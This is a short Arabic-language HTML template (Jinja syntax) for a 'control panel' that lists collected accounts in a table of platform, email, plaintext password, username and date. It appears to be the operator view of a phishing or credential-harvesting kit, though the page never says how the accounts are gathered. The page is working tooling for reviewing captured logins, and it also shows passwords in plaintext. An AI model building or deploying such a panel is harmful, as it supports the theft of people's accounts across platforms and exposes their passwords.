
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <title>لوحة التحكم</title>
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.rtl.min.css">
</head>
<body class="bg-white">
    <div class="container mt-4">
        <div class="d-flex justify-content-between align-items-center mb-4">
            <h3>لوحة التحكم - الحسابات</h3>
            <a href="/logout" class="btn btn-danger">تسجيل الخروج</a>
        </div>
        {% if accounts %}
        <div class="table-responsive">
            <table class="table table-bordered text-center">
                <thead class="table-dark">
                    <tr>
                        <th>المنصة</th>
                        <th>البريد</th>
                        <th>كلمة المرور</th>
                        <th>اسم المستخدم</th>
                        <th>التاريخ</th>
                    </tr>
                </thead>
                <tbody>
                    {% for acc in accounts %}
                    <tr>
                        <td>{{ acc.platform }}</td>
                        <td>{{ acc.email }}</td>
                        <td>{{ acc.password }}</td>
                        <td>{{ acc.username or '-' }}</td>
                        <td>{{ acc.timestamp }}</td>
                    </tr>
                    {% endfor %}
                </tbody>
            </table>
        </div>
        {% else %}
        <div class="alert alert-info text-center">لا توجد حسابات بعد.</div>
        {% endif %}
    </div>
</body>
</html>
